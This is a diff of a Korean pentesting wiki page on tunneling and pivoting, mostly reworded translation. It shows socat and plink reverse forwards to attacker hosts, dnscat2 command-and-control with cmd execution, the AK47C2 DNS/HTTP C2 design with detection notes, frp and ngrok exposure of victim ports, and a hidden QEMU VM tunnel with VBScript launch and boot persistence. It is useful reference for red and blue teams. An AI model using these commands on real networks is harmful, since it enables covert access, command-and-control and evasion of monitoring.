@@ -383,7 +421,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-로컬 SSH 포트(22)를 attacker 호스트의 443 포트에 연결합니다.
+로컬 SSH 포트(22)를 attacker 호스트의 443 포트에 연결합니다
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -393,9 +431,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Plink는 `ssh`와 유사한 SSH forwarding 옵션을 제공하는 PuTTY의 command-line connection tool입니다.<sup>[[22]](#references)</sup>
 
-SSH port에는 대문자 `-P`를 사용합니다. `-pw`는 호환성을 위해 유지되지만 process list에 password가 노출되므로, 가능한 경우 key authentication 또는 `-pwfile`을 사용하는 것이 좋습니다.<sup>[[22]](#references)[[23]](#references)</sup>
+SSH 포트에는 대문자 `-P`를 사용합니다. `-pw`는 호환성을 위해 유지되지만 process list에 password가 노출되므로, 가능한 경우 key authentication 또는 `-pwfile`을 사용하는 것이 좋습니다.<sup>[[22]](#references)[[23]](#references)</sup>
 
-이 binary는 victim에서 실행되고 SSH client이므로 reverse connection을 위해 SSH service와 port를 열어야 합니다. 다음 예제에서는 `-R`을 사용하여 locally accessible port를 attacker's machine으로 forwarding합니다.<sup>[[22]](#references)</sup>
+이 binary는 피해자 시스템에서 실행되고 SSH client이므로, reverse connection을 위해 SSH service와 port를 열어야 합니다. 다음 예제에서는 `-R`을 사용하여 로컬에서 접근 가능한 port를 attacker의 machine으로 forwarding합니다.<sup>[[22]](#references)</sup>
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -404,7 +442,7 @@ echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-지속적인 `portproxy` 규칙을 생성하거나 변경할 때는 호스트에 필요한 권한이 있는 context를 사용하세요. Microsoft는 아래에서 사용되는 `v4tov4` 추가, 표시 및 삭제 형식을 문서화하고 있습니다.<sup>[[24]](#references)</sup>
+지속적인 `portproxy` 규칙을 생성하거나 변경할 때는 호스트에 필요한 권한이 있는 context를 사용하세요. Microsoft는 아래에서 사용하는 `v4tov4` add, show 및 delete 형식을 문서화했습니다.<sup>[[24]](#references)</sup>
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -419,19 +457,19 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 시스템에 **RDP access**가 있어야 합니다.\
 다운로드:
 
-SocksOverRDP는 Remote Desktop Dynamic Virtual Channels를 사용하여 기존 RDP 세션을 통해 SOCKS5 연결을 전달합니다. client plugin은 `127.0.0.1:1080`에서 수신 대기하고, server component는 RDP target에서 실행됩니다.<sup>[[25]](#references)</sup>
+SocksOverRDP는 Remote Desktop Dynamic Virtual Channels를 사용하여 기존 RDP session을 통해 SOCKS5 connection을 전달합니다. client plugin은 `127.0.0.1:1080`에서 listen하고, server component는 RDP target에서 실행됩니다.<sup>[[25]](#references)</sup>
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 tool은 Windows의 Remote Desktop Service 기능에서 `Dynamic Virtual Channels`(`DVC`)를 사용합니다. DVC는 **RDP connection을 통해 packets를 tunneling**하는 역할을 합니다.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 tool은 Windows의 Remote Desktop Service feature에서 `Dynamic Virtual Channels`(`DVC`)를 사용합니다. DVC는 **RDP connection을 통해 packets를 tunneling**하는 역할을 합니다.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-client computer에서 다음과 같이 **`SocksOverRDP-Plugin.dll`**을 로드합니다:
+client computer에서 다음과 같이 **`SocksOverRDP-Plugin.dll`**을 load합니다:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-이제 **`mstsc.exe`**를 사용하여 **RDP**로 **victim**에 **연결**할 수 있으며, **SocksOverRDP plugin이 활성화**되었고 **127.0.0.1:1080**에서 **수신 대기**한다는 **프롬프트**가 표시되어야 합니다.
+이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **피해자**에 **연결**할 수 있으며, **SocksOverRDP plugin이 활성화되었고** **127.0.0.1:1080**에서 **수신 대기**한다는 **프롬프트**가 표시됩니다.
 
-**RDP**로 **연결**한 후 victim machine에 `SocksOverRDP-Server.exe` binary를 업로드하고 실행합니다:
+**RDP**를 통해 **연결**한 후 피해자 시스템에 `SocksOverRDP-Server.exe` 바이너리를 업로드하고 실행합니다:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -441,15 +479,15 @@ netstat -antb | findstr 1080
 ```
 이제 [**Proxifier**](https://www.proxifier.com/)를 사용하여 해당 포트를 통해 traffic을 proxy할 수 있습니다.<sup>[[26]](#references)</sup>
 
-## Windows GUI 앱을 Proxify하기
+## Windows GUI Apps Proxify
 
-[**Proxifier**](https://www.proxifier.com/)를 사용하면 Windows GUI 앱이 proxy를 통해 통신하도록 설정할 수 있습니다.<sup>[[26]](#references)</sup>\
-**Profile -> Proxy Servers**에서 SOCKS 서버의 IP와 포트를 추가합니다.\
-**Profile -> Proxification Rules**에서 proxify할 프로그램 이름과 proxify할 IP에 대한 connections를 추가합니다. Proxifier rules는 applications, target hosts 및 ports와 일치시킬 수 있습니다.<sup>[[27]](#references)</sup>
+[**Proxifier**](https://www.proxifier.com/)를 사용하여 Windows GUI apps가 proxy를 통해 이동하도록 설정할 수 있습니다.<sup>[[26]](#references)</sup>\
+**Profile -> Proxy Servers**에서 SOCKS server의 IP와 port를 추가합니다.\
+**Profile -> Proxification Rules**에서 proxify할 program의 이름과 proxify할 IP에 대한 connections를 추가합니다. Proxifier rules는 applications, target hosts, ports를 기준으로 일치시킬 수 있습니다.<sup>[[27]](#references)</sup>
 
 ## NTLM proxy를 통한 Tunnel
 
-앞서 언급한 tool인 **Rpivot**은 NTLM-authenticating proxy를 통해 relay할 수 있습니다. **OpenVPN**도 auth file과 NTLMv2 method로 구성하면 해당 proxy를 통해 route할 수 있습니다. 이는 proxy traversal이며 proxy authentication의 bypass가 아닙니다.<sup>[[20]](#references)[[28]](#references)</sup>
+앞서 언급한 tool인 **Rpivot**은 NTLM-authenticating proxy를 통해 relay할 수 있습니다. **OpenVPN**도 auth file과 NTLMv2 method로 구성하면 해당 proxy를 통해 routing할 수 있습니다. 이는 proxy traversal이며 proxy authentication을 bypass하는 것이 아닙니다.<sup>[[20]](#references)[[28]](#references)</sup>
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
 ```
@@ -457,8 +495,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Cntlm은 upstream NTLM proxies에 인증하고, local listeners를 노출하며, local tunnel port를 destination service에 매핑할 수 있습니다. 그런 다음 client는 해당 local port를 사용할 수 있습니다.<sup>[[29]](#references)</sup>\
-예를 들어 포트 443을 forward합니다.
+Cntlm은 upstream NTLM proxies에 인증하고, local listeners를 노출하며, local tunnel port를 destination service에 매핑할 수 있습니다. 그러면 clients가 해당 local port를 사용할 수 있습니다.<sup>[[29]](#references)</sup>\
+예를 들어 port 443을 forward합니다
 ```
 Username Alice
 Password P@ssw0rd
@@ -466,12 +504,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-이제 예를 들어 victim에서 **SSH** service가 port 443에서 listen하도록 설정하면, attacker의 port 2222를 통해 해당 service에 connect할 수 있습니다.<sup>[[29]](#references)</sup>\
-또한 attacker가 port 2222에서 listen하는 동안 localhost:443에 connect하는 **meterpreter**를 사용할 수도 있습니다.<sup>[[29]](#references)</sup>
+이제 예를 들어 victim에서 **SSH** 서비스가 포트 443에서 listen하도록 설정하면, attacker의 포트 2222를 통해 해당 서비스에 연결할 수 있습니다.<sup>[[29]](#references)</sup>\
+또한 attacker가 포트 2222에서 listen하는 동안 localhost:443에 연결하는 **meterpreter**를 사용할 수도 있습니다.<sup>[[29]](#references)</sup>
 
 ## YARP
 
-YARP (Yet Another Reverse Proxy)는 Microsoft의 .NET reverse-proxy toolkit입니다. 여기에서 확인할 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>
+YARP (Yet Another Reverse Proxy)는 Microsoft의 .NET reverse-proxy toolkit입니다. 다음에서 확인할 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>
 
 ## DNS Tunneling
 
@@ -493,7 +531,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**
 
-Dnscat2는 DNS를 통해 암호화된 command-and-control 채널을 구축합니다. 아래의 server 및 client 명령은 문서화된 사용법을 따릅니다.<sup>[[32]](#references)</sup>
+Dnscat2는 DNS를 통해 암호화된 command-and-control 채널을 설정합니다. 아래의 server 및 client 명령은 문서화된 사용법을 따릅니다.<sup>[[32]](#references)</sup>
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -504,21 +542,21 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **PowerShell에서**
 
-[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하면 PowerShell에서 dnscat2 client를 실행할 수 있으며, 해당 README에는 아래에 표시된 `Start-Dnscat2` 매개변수가 설명되어 있습니다.<sup>[[33]](#references)</sup>
+[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하면 PowerShell에서 dnscat2 client를 실행할 수 있으며, README에는 아래에 표시된 `Start-Dnscat2` parameters가 설명되어 있습니다.<sup>[[33]](#references)</sup>
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
 #### **dnscat을 사용한 Port forwarding**
 
-Dnscat2의 interactive `listen` command는 로컬 listener를 remote host와 port에 매핑합니다.<sup>[[32]](#references)</sup>
+Dnscat2의 interactive `listen` command는 local listener를 remote host와 port에 매핑합니다.<sup>[[32]](#references)</sup>
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
 #### proxychains DNS 변경
 
-Proxychains-ng는 동적으로 링크된 TCP 연결을 후킹하며 UDP 또는 ICMP를 전달할 수 없습니다. DNS proxying은 구성 가능하므로, 고정된 public resolver를 가정하지 말고 설치된 `proxychains.conf`와 resolver helper를 확인해야 합니다. Legacy `proxyresolv` scripts는 resolver 선택을 위해 `PROXY_DNS_SERVER`를 노출합니다. 내부 이름이 필요한 경우 pivot에서 도달 가능한 resolver를 사용하세요.<sup>[[34]](#references)[[35]](#references)</sup>
+Proxychains-ng는 동적으로 링크된 TCP 연결을 후킹하며 UDP 또는 ICMP를 전달할 수 없습니다. DNS proxying은 구성 가능하므로, 고정된 public resolver를 가정하지 말고 설치된 `proxychains.conf`와 resolver helper를 확인해야 합니다. Legacy `proxyresolv` scripts는 resolver를 선택할 수 있도록 `PROXY_DNS_SERVER`를 노출합니다. 내부 이름이 필요한 경우 pivot에서 접근 가능한 resolver를 사용하세요.<sup>[[34]](#references)[[35]](#references)</sup>
 
 ## Go의 Tunnels
 
@@ -526,36 +564,36 @@ Proxychains-ng는 동적으로 링크된 TCP 연결을 후킹하며 UDP 또는 I
 
 ### Custom DNS TXT / HTTP JSON C2 (AK47C2)
 
-Storm-2603 actor는 기업 네트워크에서 거의 차단되지 않는 두 protocol인 outbound **DNS**와 **plain HTTP POST** traffic만 악용하는 **dual-channel C2 ("AK47C2")**를 만들었습니다.<sup>[[2]](#references)</sup>
+Storm-2603 actor는 corporate network에서 거의 차단되지 않는 두 protocol인 outbound **DNS**와 **plain HTTP POST** traffic만 악용하는 **dual-channel C2 ("AK47C2")**를 생성했습니다.<sup>[[2]](#references)</sup>
 
 1. **DNS mode (AK47DNS)**
 • 무작위 5-character SessionID(예: `H4T14`)를 생성합니다.
-• *task requests*에는 `1`을, *results*에는 `2`를 앞에 붙인 뒤 여러 field(flags, SessionID, computer name)를 연결합니다.
-• 각 field는 ASCII key `VHBD@H`로 **XOR-encrypted**된 후 hex-encoded되며, dots로 연결됩니다. 마지막에는 attacker-controlled domain이 붙습니다.
+• *task requests*에는 `1`, *results*에는 `2`를 앞에 붙이고 flags, SessionID, computer name 등의 서로 다른 field를 연결합니다.
+• 각 field는 ASCII key `VHBD@H`로 **XOR-encrypted**된 후 hex-encoded되며, dots로 연결되고 마지막에는 attacker-controlled domain이 붙습니다.
 
 ```text
 <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
 ```
 
-• Requests는 **TXT** record에 `DnsQuery()`를 사용하며, **MG** record로 fallback합니다.
-• response가 0xFF bytes를 초과하면 backdoor는 data를 63-byte pieces로 **fragments**하고 다음 markers를 삽입하여 C2 server가 순서를 복원할 수 있도록 합니다:
+• Requests는 **TXT**(및 fallback **MG**) records에 `DnsQuery()`를 사용합니다.
+• Response가 0xFF bytes를 초과하면 backdoor는 data를 63-byte pieces로 **fragments**하고 다음 markers를 삽입하여 C2 server가 순서를 다시 정렬할 수 있도록 합니다.
 `s<SessionID>t<TOTAL>p<POS>`
 
 2. **HTTP mode (AK47HTTP)**
-• JSON envelope를 구성합니다:
+• JSON envelope를 구성합니다.
 ```json
 {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
 ```
-• 전체 blob은 XOR-`VHBD@H` → hex → `Content-Type: text/plain` header가 포함된 **`POST /`**의 body로 전송됩니다.
-• Reply도 동일한 encoding을 따르며, `cmd` field는 `cmd.exe /c <command> 2>&1`로 실행됩니다.
+• 전체 blob은 XOR-`VHBD@H` → hex → `Content-Type: text/plain` header를 포함한 **`POST /`**의 body로 전송됩니다.
+• Reply는 동일한 encoding을 따르며 `cmd` field는 `cmd.exe /c <command> 2>&1`로 실행됩니다.
 
 Blue Team notes
-• 첫 번째 label이 긴 hexadecimal이고 항상 하나의 드문 domain으로 끝나는 비정상적인 **TXT queries**를 찾으세요.
-• constant XOR key 뒤에 ASCII-hex가 이어지는 패턴은 YARA로 쉽게 탐지할 수 있습니다: `6?56484244?484` (`VHBD@H`의 hex 표현).
-• HTTP의 경우 순수 hex로 이루어지고 2 bytes의 배수인 text/plain POST bodies를 flag하세요.
+• 첫 번째 label이 긴 hexadecimal이고 항상 하나의 희귀 domain으로 끝나는 특이한 **TXT queries**를 찾습니다.
+• ASCII-hex가 뒤따르는 일정한 XOR key는 YARA로 쉽게 탐지할 수 있습니다: `6?56484244?484` (`VHBD@H`를 hex로 표현한 값).
+• HTTP의 경우 순수 hex이며 byte 수가 2의 배수인 text/plain POST bodies를 flag합니다.
 
 {{#note}}
-이 channel은 각 sub-domain label을 63-octet DNS limit 이내로 유지하지만, protocol compliance만으로 stealthy해지는 것은 아닙니다. 드문 domains, 긴 hexadecimal labels, query volume은 여전히 detection signals입니다.<sup>[[2]](#references)[[36]](#references)</sup>
+이 channel은 각 sub-domain label을 63-octet DNS limit 이내로 유지하지만, protocol compliance만으로 stealthy해지는 것은 아닙니다. 희귀 domain, 긴 hexadecimal labels, query volume은 여전히 detection signals로 남습니다.<sup>[[2]](#references)[[36]](#references)</sup>
 {{#endnote}}
 
 ## ICMP Tunneling
@@ -565,7 +603,7 @@ Blue Team notes
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Hans는 TUN device와 ICMP echo requests를 사용하는 IPv4-over-ICMP tunnel을 설명합니다. setup에는 interface를 생성할 수 있을 정도의 privileges가 필요합니다.<sup>[[37]](#references)</sup>
+Hans는 TUN device와 ICMP echo requests를 사용하는 IPv4-over-ICMP tunnel을 설명하며, setup을 위해서는 interface를 생성할 수 있을 정도의 privileges가 필요합니다.<sup>[[37]](#references)</sup>
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -575,7 +613,7 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 
 [**여기에서 다운로드**](https://github.com/utoni/ptunnel-ng.git).
 
-ptunnel-ng는 ICMP를 통해 TCP 연결을 전송하며, 아래에 표시된 `-p`, `-l`, `-r`, `-R` 옵션을 각각 proxy, 로컬 listener, destination host, destination port에 사용합니다.<sup>[[38]](#references)</sup>
+ptunnel-ng는 ICMP를 통해 TCP 연결을 전송하며, 아래에 표시된 `-p`, `-l`, `-r`, `-R` 옵션을 각각 프록시, 로컬 listener, 대상 호스트, 대상 포트에 사용합니다.<sup>[[38]](#references)</sup>
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -591,12 +629,12 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/)은 secure tunnel을 통해 로컬 네트워크 서비스를 온라인으로 제공하는 agent입니다. CLI는 HTTP, TCP 및 file URL endpoint를 문서화하며, 출력되는 endpoint hostname은 endpoint와 account에 따라 달라질 수 있습니다.<sup>[[39]](#references)</sup>
+[**ngrok**](https://ngrok.com/)은 보안 tunnel을 통해 로컬 네트워크 서비스를 온라인에 제공하는 agent입니다. CLI에는 HTTP, TCP 및 file URL endpoint가 문서화되어 있으며, 출력되는 endpoint hostname은 endpoint와 account에 따라 달라질 수 있습니다.<sup>[[39]](#references)</sup>
 
 ### 설치
 
 - Account 생성: https://ngrok.com/signup
-- Client download:
+- Client 다운로드:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -607,7 +645,7 @@ chmod a+x ./ngrok
 
 **문서:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_필요한 경우 agent는 authentication 및 TLS 옵션도 지원합니다.<sup>[[39]](#references)</sup>_
+_에이전트는 필요할 때 인증 및 TLS 옵션도 지원합니다.<sup>[[39]](#references)</sup>_
 
 #### TCP 터널링
 ```bash
@@ -622,26 +660,26 @@ _필요한 경우 agent는 authentication 및 TLS 옵션도 지원합니다.<sup
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### HTTP 호출 Sniffing
+#### HTTP calls Sniffing
 
 _XSS,SSRF,SSTI 등에 유용_\
-standalone agent는 기본적으로 `http://127.0.0.1:4040`에서 HTTP inspection interface를 노출하며, 해당 interface는 HTTP traffic을 위한 것입니다.<sup>[[40]](#references)</sup>
+standalone agent는 기본적으로 `http://127.0.0.1:4040`에서 HTTP inspection interface를 노출하며, 이 interface는 HTTP traffic을 위한 것입니다.<sup>[[40]](#references)</sup>
 
 #### 내부 HTTP service Tunneling
 
-`--host-header=rewrite` 옵션은 upstream HTTP `Host` header를 로컬 service와 일치하도록 rewrite합니다.<sup>[[41]](#references)</sup>
+`--host-header=rewrite` 옵션은 upstream HTTP `Host` header를 local service와 일치하도록 다시 작성합니다.<sup>[[41]](#references)</sup>
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yaml 간단한 구성 예시
+#### ngrok.yaml 간단한 configuration 예제
 
-이 구성은 ngrok Agent Config v2를 사용합니다. named tunnels는 `proto` 및 `addr`를 사용하며 `ngrok start`로 시작합니다.<sup>[[42]](#references)</sup> 다음 3개의 터널을 엽니다:
+이 예제는 ngrok Agent Config v2를 사용합니다. named tunnel은 `proto`와 `addr`을 사용하며 `ngrok start`로 시작합니다.<sup>[[42]](#references)</sup> 총 3개의 tunnel을 엽니다:
 
-- 2개의 TCP
-- /tmp/httpbin/의 static files를 제공하는 1개의 HTTP
+- TCP 2개
+- `/tmp/httpbin/`에서 static files를 제공하는 HTTP 1개
 ```yaml
 version: 2
 tunnels:
@@ -657,9 +695,9 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflare Tunnel의 `cloudflared` connector는 outbound connection을 수립합니다. published application은 HTTP, HTTPS, TCP, SSH, RDP를 라우팅할 수 있으며, quick tunnel은 HTTP development 용도로 사용됩니다.<sup>[[43]](#references)[[45]](#references)</sup>
+Cloudflare Tunnel의 `cloudflared` connector는 outbound connections을 설정하며, 공개된 애플리케이션은 HTTP, HTTPS, TCP, SSH 및 RDP를 라우팅할 수 있고, quick tunnels는 HTTP 개발 용도로 사용됩니다.<sup>[[43]](#references)[[45]](#references)</sup>
 
-### Quick tunnel 한 줄 명령
+### Quick tunnel one-liner
 ```bash
 # Expose a local web service listening on 8080
 cloudflared tunnel --url http://localhost:8080
@@ -667,14 +705,14 @@ cloudflared tunnel --url http://localhost:8080
 ```
 ### SOCKS5 origin (legacy mode)
 
-레거시 `--socks5` 플래그는 `cloudflared`에 로컬 origin이 SOCKS5를 사용한다고 알리며, 로컬 SOCKS5 listener를 생성하지는 않습니다. managed tunnel에서는 `originRequest.proxyType: socks`가 SOCKS5 origin 처리를 구성합니다.<sup>[[44]](#references)</sup>
+legacy `--socks5` flag는 로컬 origin이 SOCKS5를 사용한다는 것을 `cloudflared`에 알리며, 로컬 SOCKS5 listener를 생성하지는 않습니다. managed tunnel에서는 `originRequest.proxyType: socks`가 SOCKS5 origin 처리를 구성합니다.<sup>[[44]](#references)</sup>
 ```bash
 # Expose a local SOCKS5-speaking origin (legacy syntax)
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 ```
-### DNS를 사용한 지속적 tunnel
+### DNS를 사용하는 Persistent tunnels
 
-로컬에서 관리되는 tunnel 구성은 아래와 같이 소문자로 된 `tunnel`, `credentials-file`, `url` 키를 사용합니다.<sup>[[46]](#references)</sup>
+로컬에서 관리되는 tunnel configuration은 아래와 같이 소문자 `tunnel`, `credentials-file`, `url` 키를 사용합니다.<sup>[[46]](#references)</sup>
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -683,15 +721,15 @@ tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-커넥터 시작:
+커넥터를 시작하세요:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-커넥터는 outbound connections을 설정하며, 기본적으로 QUIC을 협상하고 HTTP/2로 fallback합니다. 모든 deployment가 TCP/443을 사용한다고 가정하지 마세요. deployment에 필요한 privileges만 사용하여 실행하세요.<sup>[[43]](#references)[[47]](#references)</sup>
+커넥터는 outbound connections을 설정하며, 기본적으로 HTTP/2로 fallback하는 QUIC를 협상합니다. 모든 deployment가 TCP/443을 사용하는 것은 아니라고 가정해야 합니다. deployment에 필요한 권한만 사용하여 실행하세요.<sup>[[43]](#references)[[47]](#references)</sup>
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, XTCP**를 지원하는 Go reverse proxy입니다. XTCP는 성공 여부가 NAT에 따라 달라지는 P2P hole punching을 사용합니다. **v0.53.0**부터는 **SSH Tunnel Gateway**로 동작할 수 있으므로, target host는 `frpc` binary 없이 기본 OpenSSH client를 사용할 수 있습니다.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
+[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX 및 XTCP**를 지원하는 Go reverse proxy입니다. XTCP는 성공 여부가 NAT에 따라 달라지는 P2P hole punching을 사용합니다. **v0.53.0**부터는 **SSH Tunnel Gateway**로 작동할 수 있으므로, target host는 `frpc` binary 없이 기본 OpenSSH client를 사용할 수 있습니다.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
 
 ### 기본 reverse TCP tunnel
 ```bash
@@ -721,13 +759,13 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-위 명령은 `frps`가 gateway를 제공하는 동안 기본 OpenSSH client를 사용해 victim의 **8080** port를 **attacker_ip:9000**으로 게시합니다.<sup>[[50]](#references)</sup>
+위 명령은 `frps`가 gateway를 제공하는 동안 기본 OpenSSH client를 사용하여 피해자의 **8080** 포트를 **attacker_ip:9000**으로 publish합니다.<sup>[[50]](#references)</sup>
 
-## QEMU를 사용한 은밀한 VM 기반 Tunnel
+## QEMU를 사용한 은밀한 VM 기반 Tunnels
 
-QEMU user-mode networking은 virtual network에 root 또는 administrator privilege를 필요로 하지 않으며, `-netdev user,hostfwd=...`는 host에서 guest로 TCP, UDP 또는 UNIX connection을 redirect합니다.<sup>[[51]](#references)</sup> TrustedSec은 host 중심 EDR이 guest 내부의 activity를 놓칠 수 있었던 incident에서 Tiny Core QEMU VM과 reverse SSH tunnel 시도를 문서화했습니다.<sup>[[1]](#references)</sup>
+QEMU user-mode networking은 virtual network에 root 또는 administrator privilege를 요구하지 않으며, `-netdev user,hostfwd=...`는 host에서 guest로 TCP, UDP 또는 UNIX connections를 redirect합니다.<sup>[[51]](#references)</sup> TrustedSec은 host에 초점을 둔 EDR이 guest 내부의 activity를 놓칠 수 있었던 incident에서 Tiny Core QEMU VM과 시도된 reverse SSH tunnel을 문서화했습니다.<sup>[[1]](#references)</sup>
 
-### 빠른 one-liner
+### 간단한 one-liner
 ```powershell
 # Windows victim (user-mode networking; no TAP driver is needed for this example)
 qemu-system-x86_64.exe ^
@@ -737,13 +775,13 @@ qemu-system-x86_64.exe ^
 -device e1000,netdev=n0 ^
 -nographic
 ```
-• 위 명령은 게스트 메모리 256 MiB와 qcow2 디스크 image를 사용하는 **Tiny Core Linux** 게스트를 실행합니다. 디스크 image는 in-RAM 디스크가 아닙니다.  
-• Windows 호스트의 **2222/tcp** 포트는 게스트 내부의 **22/tcp**로 투명하게 전달됩니다.  
-• 공격자의 관점에서 대상은 단순히 2222 포트를 노출하며, 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버가 처리합니다.
+• 위 명령은 게스트 메모리 256 MiB와 qcow2 디스크 이미지를 사용하는 **Tiny Core Linux** 게스트를 실행합니다. 디스크 이미지는 in-RAM 디스크가 아닙니다.  
+• Windows 호스트의 포트 **2222/tcp**는 게스트 내부의 **22/tcp**로 투명하게 포워딩됩니다.  
+• 공격자의 관점에서 대상은 단순히 포트 2222를 노출합니다. 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버가 처리합니다.
 
-### VBScript를 통해 은밀하게 실행하기
+### VBScript를 통한 은밀한 실행
 
-TrustedSec은 위에서 언급한 incident에서 VBS 기반 QEMU 실행과 Tiny Core image가 사용된 것을 확인했습니다.<sup>[[1]](#references)</sup>
+TrustedSec은 위에서 인용한 incident에서 VBS 기반 QEMU 실행과 Tiny Core 이미지를 관찰했습니다.<sup>[[1]](#references)</sup>
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
@@ -751,11 +789,11 @@ o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tc
 ```
 `cscript.exe //B update.vbs`로 스크립트를 실행하면 창이 계속 숨겨진 상태로 유지됩니다.<sup>[[1]](#references)</sup>
 
-### 게스트 내부 지속성
+### 게스트 내부 persistence
 
-인용된 사고에서는 `/opt/bootlocal.sh` 및 `/opt/filetool.lst`를 통해 상태 비저장 Tiny Core guest에서 지속성을 확보했습니다.<sup>[[1]](#references)</sup>
+인용된 incident에서는 `/opt/bootlocal.sh` 및 `/opt/filetool.lst`를 통해 stateless Tiny Core guest에서 persistence를 확보하는 방법을 설명합니다.<sup>[[1]](#references)</sup>
 
-1. 페이로드를 `/opt/123.out`에 저장합니다.
+1. Payload를 `/opt/123.out`에 저장합니다.
 2. `/opt/bootlocal.sh`에 다음을 추가합니다.
 
 ```sh
@@ -763,28 +801,28 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 /opt/123.out
 ```
 
-3. `home/tc` 및 `opt`를 `/opt/filetool.lst`에 추가하여 종료 시 페이로드가 `mydata.tgz`에 패키징되도록 합니다.
+3. `home/tc` 및 `opt`를 `/opt/filetool.lst`에 추가하여 종료 시 payload가 `mydata.tgz`에 패킹되도록 합니다.
 
 ### Telemetry 고려 사항
 
-• 호스트에는 여전히 QEMU 프로세스, qcow2 image 및 호스트에서 전달된 listener가 노출됩니다.
